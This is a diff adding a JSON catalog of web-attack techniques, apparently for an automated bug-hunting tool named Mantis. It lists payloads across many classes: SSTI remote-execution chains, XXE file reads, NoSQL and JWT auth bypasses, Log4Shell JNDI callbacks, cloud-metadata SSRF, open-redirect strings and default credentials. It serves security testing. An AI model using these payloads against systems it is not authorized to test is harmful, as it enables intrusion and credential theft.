@@ -1,0 +1,464 @@
+{
+  "version": 1,
+  "description": "Extended hunter technique catalog. Each entry is a per-vulnerability-class drill-down loaded alongside hunter-techniques.json. Authored 2026-05-17 to widen Mantis's coverage beyond the original 8 broad categories. Read-only reference material; execution lives in MCP tools and agents.",
+  "entries": [
+    {
+      "id": "idor-sequential-int",
+      "title": "IDOR — sequential integer IDs",
+      "vuln_class": "broken-access-control.idor",
+      "match": {
+        "tech": ["rest", "api", "rails", "django", "express"],
+        "endpoints": ["/users/", "/orders/", "/invoices/", "/documents/", "/messages/", "/posts/"],
+        "params": ["id", "user_id", "order_id", "doc_id", "msg_id"],
+        "hints": ["idor", "sequential", "enumeration"]
+      },
+      "techniques": [
+        "Enumerate adjacent IDs: GET .../id/N → GET .../id/N±1. Confirmed when attacker reads victim records with attacker-only credentials.",
+        "Probe both numeric and stringified IDs (`123` vs `'123'`); Rails/Django sometimes diverge.",
+        "Replay under (unauth, attacker, victim) and classify with `mantis_run_auth_differential`."
+      ],
+      "payload_hints": [
+        "Burst 50 sequential IDs in one wave; flag any 200 response with a different `organization_id`/`tenant_id`."
+      ]
+    },
+    {
+      "id": "idor-uuid-prediction",
+      "title": "IDOR — UUID predictability",
+      "vuln_class": "broken-access-control.idor",
+      "match": {"tech": ["v4-uuid", "snowflake", "ulid"], "hints": ["uuid", "snowflake"]},
+      "techniques": [
+        "Collect 50+ UUIDs of the same object type, then check for time/sequence clustering. UUIDv1 + ULID are time-ordered → enumerable.",
+        "Look for ID-in-JWT: decode the access token and probe the `sub` field."
+      ],
+      "payload_hints": ["Sort observed IDs by timestamp; predict next-N with timestamp + counter offset."]
+    },
+    {
+      "id": "mass-assignment-patch",
+      "title": "Mass assignment via PATCH/PUT/POST",
+      "vuln_class": "broken-access-control.mass-assignment",
+      "match": {"endpoints": ["/users/me", "/profile", "/settings", "/api/users/"], "hints": ["patch", "put", "profile"]},
+      "techniques": [
+        "PATCH the current user with body fields the form doesn't expose: `role`, `is_admin`, `verified`, `tenant_id`, `permissions`, `email_verified`, `credits`, `subscription_tier`.",
+        "If the route normalizes camelCase ↔ snake_case, try both for every privileged field.",
+        "Try GraphQL mutation analogues for `updateUser(input: {role: 'admin'})` even when the schema's `input` type omits `role`."
+      ],
+      "payload_hints": ["PATCH /api/users/me {\"role\":\"admin\"} ; PATCH /api/users/me {\"is_admin\":true}"]
+    },
+    {
+      "id": "ssrf-cloud-metadata",
+      "title": "SSRF — cloud metadata endpoints",
+      "vuln_class": "ssrf",
+      "match": {"hints": ["url", "fetch", "preview", "proxy", "webhook", "import"]},
+      "techniques": [
+        "Test each major cloud's metadata endpoint as the SSRF payload: AWS IMDSv1 169.254.169.254/latest/meta-data/, GCP metadata.google.internal/computeMetadata/v1/, Azure 169.254.169.254/metadata/instance, Alibaba 100.100.100.200/latest/meta-data/.",
+        "When IMDSv2 is enforced, try the PUT-then-GET token flow; the SSRF must support state.",
+        "Reflect-style: parameter must echo body content. Blind: use OOB DNS canary."
+      ],
+      "payload_hints": ["?url=http://169.254.169.254/latest/meta-data/", "?webhook=http://169.254.169.254/computeMetadata/v1/ -H 'Metadata-Flavor:Google'"]
+    },
+    {
+      "id": "ssrf-blind-oob",
+      "title": "SSRF — blind via OOB DNS / HTTP",
+      "vuln_class": "ssrf",
+      "match": {"hints": ["webhook", "callback", "image_url", "import"]},
+      "techniques": [
+        "Set up an OOB collector (interactsh / burp collaborator). Send the unique subdomain as the SSRF target.",
+        "Record any DNS / HTTP / SMTP traffic back to the collector — that's the proof."
+      ],
+      "payload_hints": ["http://<unique>.oast.live/", "smb://<unique>.oast.live/share"]
+    },
+    {
+      "id": "ssti-jinja2",
+      "title": "SSTI — Jinja2 / Flask",
+      "vuln_class": "ssti",
+      "match": {"tech": ["flask", "jinja2", "python"]},
+      "techniques": [
+        "Reflect `{{7*7}}` → 49 confirms. Then probe `{{config}}` → leaks `SECRET_KEY`. Then `{{ ''.__class__.__mro__[1].__subclasses__() }}` for RCE class walk."
+      ],
+      "payload_hints": ["{{7*7}}", "{{config.items()}}", "{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}"]
+    },
+    {
+      "id": "ssti-erb",
+      "title": "SSTI — ERB / Ruby",
+      "vuln_class": "ssti",
+      "match": {"tech": ["rails", "ruby", "erb"]},
+      "techniques": ["<%= 7*7 %> → 49 confirms. <%= IO.popen('id').read %> → RCE."]
+    },
+    {
+      "id": "nosql-mongo-ne",
+      "title": "NoSQL injection — Mongo $ne / $gt operator bypass",
+      "vuln_class": "nosql-injection",
+      "match": {"tech": ["mongo", "mongodb", "express", "node"], "endpoints": ["/login", "/api/auth"]},
+      "techniques": [
+        "POST `{\"username\":{\"$ne\":null},\"password\":{\"$ne\":null}}` to login endpoints. 2xx + session cookie = confirmed.",
+        "Probe array operators: `{\"username[$gt]\":\"\",\"password[$gt]\":\"\"}` (query-string variant).",
+        "Test JS-eval payloads: `{\"$where\":\"sleep(5000)\"}` for blind detection."
+      ],
+      "payload_hints": ["{\"username\":{\"$ne\":null}}", "username[$gt]=&password[$gt]="]
+    },
+    {
+      "id": "xxe-classic",
+      "title": "XXE — classic external entity",
+      "vuln_class": "xxe",
+      "match": {"endpoints": ["/api/xml", "/upload"], "tech": ["soap", "xml"]},
+      "techniques": [
+        "POST `<!ENTITY xxe SYSTEM 'file:///etc/passwd'> <foo>&xxe;</foo>`. Confirmed when `root:x:` appears.",
+        "Blind variant: external DTD with `<!ENTITY % p SYSTEM 'http://collaborator/dtd'> %p;`."
+      ]
+    },
+    {
+      "id": "open-redirect-whitelist-bypass",
+      "title": "Open redirect — whitelist parser bypass",
+      "vuln_class": "open-redirect",
+      "match": {"params": ["next", "redirect", "return_to", "url"], "hints": ["redirect", "login", "logout"]},
+      "techniques": [
+        "Try parser-divergence payloads: `//evil.example`, `https://victim.com@evil.example`, `https://evil.example/?victim.com`, `//\\evil.example`, `https:/\\evil.example`, `https://evil.example#victim.com`."
+      ],
+      "payload_hints": ["?next=//evil.attacker.tld", "?redirect_uri=https://victim.com@evil.attacker.tld"]
+    },
+    {
+      "id": "crlf-header-injection",
+      "title": "CRLF — header injection",
+      "vuln_class": "crlf-injection",
+      "match": {"hints": ["url", "redirect", "lang"]},
+      "techniques": ["Inject `%0d%0aX-Mantis-Crlf:%201` in query; flag confirmed when the injected header is echoed in response."]
+    },
+    {
+      "id": "host-header-reset-injection",
+      "title": "Host header — password reset link poisoning",
+      "vuln_class": "host-header-injection",
+      "match": {"endpoints": ["/forgot", "/reset", "/recover"]},
+      "techniques": [
+        "Send password-reset request with `Host: evil.attacker.tld` and `X-Forwarded-Host: evil.attacker.tld`. The email's reset link should point to the spoofed host.",
+        "OOB-confirm via the attacker's mail inbox.",
+        "Companion variant: cache-poison the home page with a spoofed Host so other users get attacker-controlled JS."
+      ]
+    },
+    {
+      "id": "path-traversal-encoded",
+      "title": "Path traversal — encoded variants",
+      "vuln_class": "path-traversal",
+      "match": {"params": ["file", "path", "name", "doc", "page"]},
+      "techniques": [
+        "Try `../`, URL-encoded `..%2F`, double-encoded `..%252F`, Unicode `%c0%af`, null-byte `%00`. Flag confirmed on `root:x:` or `[fonts]` markers."
+      ]
+    },
+    {
+      "id": "ldap-injection-bypass",
+      "title": "LDAP injection — auth bypass",
+      "vuln_class": "ldap-injection",
+      "match": {"endpoints": ["/ldap", "/login", "/directory"]},
+      "techniques": ["Inject `*)(uid=*` or `*)|(uid=*` into search filters; compare response length to confirm divergence."]
+    },
+    {
+      "id": "command-injection-shell-meta",
+      "title": "Command injection — shell metacharacters",
+      "vuln_class": "command-injection",
+      "match": {"endpoints": ["/ping", "/nslookup", "/trace", "/exec"]},
+      "techniques": [
+        "Probe `;id`, `|id`, `` `id` ``, `$(id)`, `&&id`. Flag confirmed when `uid=` + `gid=` appear in the body or response time exceeds baseline (blind time-based).",
+        "Blind variant: `;sleep%205`. If wall-clock ≥ 5s, confirmed."
+      ]
+    },
+    {
+      "id": "file-upload-extension-bypass",
+      "title": "File upload — extension bypass",
+      "vuln_class": "file-upload",
+      "match": {"endpoints": ["/upload", "/file"]},
+      "techniques": [
+        "Test extension confusion: `shell.php.jpg`, `shell.php%00.jpg`, `shell.phtml`, `shell.phP` (Windows case fold).",
+        "Test content-type override: `Content-Type: image/png` with PHP body.",
+        "Test polyglot files: image with embedded PHP via EXIF comment."
+      ]
+    },
+    {
+      "id": "cache-poisoning-unkeyed-headers",
+      "title": "Cache poisoning — unkeyed header reflection",
+      "vuln_class": "cache-poisoning",
+      "match": {"hints": ["cdn", "varnish", "cloudfront"]},
+      "techniques": [
+        "Add unkeyed headers (`X-Forwarded-Host`, `X-Host`, `X-Original-URL`) with attacker payloads; check that the response body reflects the payload AND the cache has retained the poisoned response for the next clean request."
+      ]
+    },
+    {
+      "id": "http-smuggling-cl-te",
+      "title": "HTTP smuggling — CL.TE",
+      "vuln_class": "http-smuggling",
+      "match": {"tech": ["nginx", "haproxy", "varnish"]},
+      "techniques": [
+        "Send a request with both `Content-Length` and `Transfer-Encoding: chunked`. Front-end uses CL, back-end uses TE → the smuggled prefix is parsed as a new request. Time-based confirmation via deliberate delay in the second request."
+      ]
+    },
+    {
+      "id": "subdomain-takeover-s3",
+      "title": "Subdomain takeover — S3 NoSuchBucket",
+      "vuln_class": "subdomain-takeover",
+      "match": {"hints": ["s3", "cname", "404"]},
+      "techniques": [
+        "404 page contains `NoSuchBucket` → DNS CNAME points at unclaimed S3 bucket. Confirm by attempting to register the bucket name in AWS (the operator does this — do not register unannounced)."
+      ]
+    },
+    {
+      "id": "subdomain-takeover-heroku",
+      "title": "Subdomain takeover — Heroku app",
+      "vuln_class": "subdomain-takeover",
+      "match": {"hints": ["heroku", "cname"]},
+      "techniques": ["Body contains `There is no app configured at that hostname` → attacker may register the Heroku app."]
+    },
+    {
+      "id": "dom-xss-postmessage",
+      "title": "DOM XSS — postMessage origin handling",
+      "vuln_class": "xss-dom",
+      "match": {"hints": ["postmessage", "window.parent"]},
+      "techniques": [
+        "Grep page JS for `window.addEventListener('message', ...)` handlers that don't check `event.origin`. Try sending a `postMessage` from an attacker-controlled iframe with payloads that hit a sink (`innerHTML`, `location.href`)."
+      ]
+    },
+    {
+      "id": "cors-credentials-reflection",
+      "title": "CORS — reflected origin with credentials",
+      "vuln_class": "cors-misconfig",
+      "match": {"hints": ["cors", "origin"]},
+      "techniques": [
+        "Send `Origin: https://attacker.example` and check the response for `Access-Control-Allow-Origin: https://attacker.example` AND `Access-Control-Allow-Credentials: true`. That's exfil-grade."
+      ]
+    },
+    {
+      "id": "jwt-alg-none",
+      "title": "JWT — alg:none",
+      "vuln_class": "broken-authentication.jwt",
+      "match": {"hints": ["jwt", "bearer"]},
+      "techniques": [
+        "Forge a JWT with `{\"alg\":\"none\"}` header and no signature. If the server accepts it, the auth is broken.",
+        "Variants: case-fold `None`, `NONE`, `nOnE`."
+      ]
+    },
+    {
+      "id": "jwt-alg-confusion",
+      "title": "JWT — HS256/RS256 confusion",
+      "vuln_class": "broken-authentication.jwt",
+      "match": {"hints": ["jwt", "rs256", "hs256"]},
+      "techniques": [
+        "Take the server's RS256 public key. Sign a forged JWT using that PEM as the HMAC secret. If accepted, the library treats `alg` as advisory."
+      ]
+    },
+    {
+      "id": "jwt-kid-traversal",
+      "title": "JWT — kid header traversal",
+      "vuln_class": "broken-authentication.jwt",
+      "match": {"hints": ["jwt", "kid"]},
+      "techniques": [
+        "Set `kid` to `../../../../dev/null` and sign with empty key. Some libraries `os.path.join(key_dir, kid)` and read attacker-controlled paths.",
+        "SQL variants when kid is a DB lookup: `' UNION SELECT 'attacker-key'--`."
+      ]
+    },
+    {
+      "id": "oauth-state-csrf",
+      "title": "OAuth — missing/predictable state CSRF",
+      "vuln_class": "broken-authentication.oauth",
+      "match": {"endpoints": ["/oauth/callback", "/auth/callback"]},
+      "techniques": [
+        "Initiate OAuth flow as attacker, capture the callback URL with code. Stop before redeeming. Send the callback URL to a victim. If the victim's session redeems the code, the attacker's identity is now bound to the victim's account."
+      ]
+    },
+    {
+      "id": "oauth-redirect-uri-bypass",
+      "title": "OAuth — redirect_uri parser bypass",
+      "vuln_class": "broken-authentication.oauth",
+      "match": {"endpoints": ["/oauth/authorize"]},
+      "techniques": [
+        "Probe parser-bypass variants of redirect_uri: path-traversal `/callback/../evil`, double-encoded, fragment `#@evil`, userinfo `https://victim@evil`. If accepted, attacker steals the auth code via their callback handler."
+      ]
+    },
+    {
+      "id": "graphql-introspection-enabled",
+      "title": "GraphQL — introspection enabled",
+      "vuln_class": "info-disclosure.graphql",
+      "match": {"endpoints": ["/graphql"]},
+      "techniques": ["POST `{__schema{queryType{name}}}`. If returned with the schema map, dump the full schema with the introspection query for mapping mutation surface."]
+    },
+    {
+      "id": "graphql-alias-batching",
+      "title": "GraphQL — alias batching to bypass rate-limit / auth",
+      "vuln_class": "broken-access-control.graphql",
+      "match": {"endpoints": ["/graphql"]},
+      "techniques": ["Wrap N copies of a mutation in one query body with aliases `m1: mut(...) m2: mut(...) ... m999: mut(...)`. If middleware rate-limits per request rather than per mutation, the limit is bypassed."]
+    },
+    {
+      "id": "graphql-field-suggestion-leak",
+      "title": "GraphQL — field suggestion leaks schema",
+      "vuln_class": "info-disclosure.graphql",
+      "match": {"endpoints": ["/graphql"]},
+      "techniques": ["Send a query with a typo'd field name. Apollo returns a suggestion like `Did you mean 'totalPrice'?` — partial introspection leak."]
+    },
+    {
+      "id": "race-condition-toctou",
+      "title": "Race condition — TOCTOU on balance / coupon",
+      "vuln_class": "race-condition",
+      "match": {"endpoints": ["/api/payments", "/api/withdraw", "/api/redeem"]},
+      "techniques": [
+        "Fire N parallel POST requests against an endpoint that does check-then-act on a numeric balance. If the post-condition sum exceeds the pre-condition cap, the race is exploitable.",
+        "Use Burp's null-byte-prefix `0x20+0x00` trick to keep requests held until release."
+      ]
+    },
+    {
+      "id": "default-credentials",
+      "title": "Default credentials enumeration",
+      "vuln_class": "broken-authentication.default-creds",
+      "match": {"endpoints": ["/admin", "/login", "/manager", "/console"]},
+      "techniques": ["Try the documented defaults for the detected tech: tomcat manager/manager, jboss admin/admin, kibana elastic/changeme, jenkins admin/admin, default Grafana admin/admin, postgres postgres/postgres."]
+    },
+    {
+      "id": "actuator-exposure",
+      "title": "Spring actuator exposure",
+      "vuln_class": "info-disclosure.actuator",
+      "match": {"endpoints": ["/actuator", "/manage"]},
+      "techniques": [
+        "Probe /actuator/env, /actuator/heapdump, /actuator/mappings, /actuator/loggers. /env returns env vars (often with secrets). /heapdump is a full memory dump and can be parsed for any in-memory credential."
+      ]
+    },
+    {
+      "id": "git-config-exposure",
+      "title": ".git/ directory exposure",
+      "vuln_class": "info-disclosure.git",
+      "match": {"endpoints": ["/.git/"]},
+      "techniques": [
+        "GET /.git/config returns the repo's config. If 200, walk /.git/HEAD → refs → objects/<sha>/ to dump the entire repo and extract source + secrets."
+      ]
+    },
+    {
+      "id": "env-file-exposure",
+      "title": ".env exposure",
+      "vuln_class": "info-disclosure.env",
+      "match": {"endpoints": ["/.env"]},
+      "techniques": ["GET /.env. If 200 with KEY=value lines, the host is leaking dev creds (DB password, API keys)."]
+    },
+    {
+      "id": "source-map-exposure",
+      "title": "Source map exposure",
+      "vuln_class": "info-disclosure.source-map",
+      "match": {"hints": ["webpack", "source-map"]},
+      "techniques": ["GET <bundle>.js.map. If 200, the response contains the unminified source — useful for finding hidden admin endpoints and secrets baked into the client."]
+    },
+    {
+      "id": "websocket-origin-bypass",
+      "title": "WebSocket — origin check missing",
+      "vuln_class": "broken-authentication.websocket",
+      "match": {"hints": ["websocket", "ws://", "wss://"]},
+      "techniques": ["Connect to the WS endpoint from a cross-origin iframe under attacker control. If the server accepts the connection and the session cookie is carried, all bets are off."]
+    },
+    {
+      "id": "csrf-api-missing-token",
+      "title": "CSRF on API — missing or weak token",
+      "vuln_class": "csrf",
+      "match": {"endpoints": ["/api/"]},
+      "techniques": ["Drop or modify the CSRF token in a state-changing request. If the action still succeeds, the protection is bypass-able. Test SameSite cookie value too."]
+    },
+    {
+      "id": "bfla-broken-function-level-auth",
+      "title": "BFLA — broken function-level auth",
+      "vuln_class": "broken-function-level-auth",
+      "match": {"endpoints": ["/api/admin/", "/api/internal/"]},
+      "techniques": [
+        "As a low-privileged user, hit `/api/admin/*` and `/api/internal/*` endpoints. Many APIs scope by URL prefix but check role only at the controller, leaving prefix-less variants reachable."
+      ]
+    },
+    {
+      "id": "excessive-data-exposure",
+      "title": "Excessive data exposure",
+      "vuln_class": "info-disclosure.excessive-data",
+      "match": {"endpoints": ["/api/users/", "/api/profile"]},
+      "techniques": [
+        "Endpoints that return user objects often include `password_hash`, `password_reset_token`, `email_verified`, `internal_id`, `created_by`, etc. Check the JSON response key list against the documented public schema."
+      ]
+    },
+    {
+      "id": "log4shell-jndi",
+      "title": "Log4Shell / JNDI deserialization",
+      "vuln_class": "deserialization",
+      "match": {"tech": ["java", "log4j"]},
+      "techniques": [
+        "Inject `${jndi:ldap://oast.live/x}` into headers (User-Agent, X-Api-Version, etc.). If the server's logger evaluates the lookup, the JNDI fetch hits the OAST collector.",
+        "Newer payloads bypass naive filters: `${${::-j}ndi:ldap://x}`."
+      ]
+    },
+    {
+      "id": "prototype-pollution-server",
+      "title": "Prototype pollution — server-side Node",
+      "vuln_class": "prototype-pollution",
+      "match": {"tech": ["express", "node", "lodash"]},
+      "techniques": [
+        "POST a body with `__proto__.role=admin` or `constructor.prototype.isAdmin=true`. If merging libraries (lodash.merge, set-value) are used, the attribute flips for every subsequent object."
+      ]
+    },
+    {
+      "id": "saml-xml-signature-wrapping",
+      "title": "SAML — XML signature wrapping",
+      "vuln_class": "broken-authentication.saml",
+      "match": {"hints": ["saml", "sso"]},
+      "techniques": [
+        "Wrap the legitimately signed assertion in an outer Assertion with attacker-supplied NameID; some validators read NameID from the outer element and signature from the inner."
+      ]
+    },
+    {
+      "id": "saml-cert-confusion",
+      "title": "SAML — cert / KeyInfo confusion",
+      "vuln_class": "broken-authentication.saml",
+      "match": {"hints": ["saml"]},
+      "techniques": ["Embed attacker-generated KeyInfo in the assertion. Validators that trust the assertion-embedded key over the IdP's pinned cert are exploitable."]
+    },
+    {
+      "id": "verb-tampering",
+      "title": "HTTP verb tampering",
+      "vuln_class": "broken-access-control.verb-tampering",
+      "match": {"endpoints": ["/api/"]},
+      "techniques": [
+        "If GET /api/admin/users is 401, try POST, PUT, PATCH, DELETE, OPTIONS, TRACE on the same path. Java EE web.xml constraints sometimes only block specific verbs.",
+        "Try `X-HTTP-Method-Override: PUT` on POST endpoints."
+      ]
+    },
+    {
+      "id": "content-type-tampering",
+      "title": "Content-Type tampering",
+      "vuln_class": "broken-access-control.parser-confusion",
+      "match": {"endpoints": ["/api/"]},
+      "techniques": [
+        "Send the same body with different Content-Type headers (`application/json`, `application/x-www-form-urlencoded`, `application/xml`). Many web frameworks have distinct parsers with different authz semantics."
+      ]
+    },
+    {
+      "id": "webhook-url-whitelist-bypass",
+      "title": "Webhook URL whitelist bypass",
+      "vuln_class": "ssrf.webhook",
+      "match": {"endpoints": ["/webhook", "/integrations/"]},
+      "techniques": [
+        "Most whitelists check the URL host. Try: `https://allowed.example.com@attacker.example`, `https://attacker.example#allowed.example.com`, IPv6 representation, decimal IP, DNS rebinding."
+      ]
+    },
+    {
+      "id": "second-order-sqli",
+      "title": "Second-order SQL injection",
+      "vuln_class": "sqli",
+      "match": {"endpoints": ["/profile", "/settings"]},
+      "techniques": [
+        "Set a profile field (display name, bio) to a payload that escapes the eventual query context (e.g. `';SLEEP(5);--`). Trigger the second-order path (admin dashboard listing all users) and watch for delay."
+      ]
+    },
+    {
+      "id": "stored-xss-via-svg",
+      "title": "Stored XSS via SVG upload",
+      "vuln_class": "xss-stored",
+      "match": {"endpoints": ["/upload"]},
+      "techniques": [
+        "Upload an SVG containing `<script>alert(1)</script>` as a user avatar. If the server serves the SVG with `Content-Type: image/svg+xml` and no `X-Content-Type-Options: nosniff`, modern browsers execute it."
+      ]
+    },
+    {
+      "id": "open-admin-panel",
+      "title": "Open admin panel discovery",
+      "vuln_class": "broken-access-control.admin-panel",
+      "match": {"endpoints": ["/admin", "/admin/dashboard", "/manage", "/console"]},
+      "techniques": ["GET /admin without auth. If 200 with admin UI, the panel is exposed. Try paths from the metadata catalog: /admin, /admin.php, /administrator, /manager, /console."]
+    }
+  ]
+}
